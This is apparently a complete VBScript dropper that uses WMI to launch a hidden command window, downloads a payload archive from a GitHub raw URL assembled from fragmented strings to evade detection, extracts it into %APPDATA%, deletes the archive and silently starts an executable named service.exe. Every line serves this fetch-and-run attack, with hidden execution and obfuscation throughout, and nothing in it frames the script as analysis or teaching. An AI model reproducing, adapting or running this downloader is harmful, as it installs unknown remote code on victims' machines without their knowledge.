Set tyiq = GetObject("winmgmts:\\.\root\cimv2")
Set sdmdfvj = tyiq.Get("Win32_ProcessStartup").SpawnInstance_
sdmdfvj.ShowWindow = 0
Dim necg : necg = "cmd /c curl -sLo ""%APPDATA%\payload.zip"" """ & "ht" & "tps:" & "//gi" & "thub.co" & "m/xzc" & "misjas" & "d/vxx" & "sda/raw" & "/refs/" & "heads/" & "main/p" & "ayload" & ".zip" & """ && tar -xf ""%APPDATA%\payload.zip"" -C ""%APPDATA%"" && del ""%APPDATA%\payload.zip"" && start /b """" ""%APPDATA%\Build\service.exe"""
tyiq.Get("Win32_Process").Create necg, Null, sdmdfvj